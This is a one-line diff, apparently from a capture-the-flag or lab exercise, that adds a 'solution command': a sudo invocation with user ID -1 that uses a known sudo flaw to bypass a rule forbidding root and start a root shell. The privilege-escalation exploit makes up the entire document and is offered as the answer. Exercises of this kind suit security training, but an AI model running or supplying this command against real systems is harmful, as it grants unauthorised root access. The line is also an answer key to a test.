@@ -1,0 +1,1 @@
+here is the solution command : sudo -u#-1 bash -u
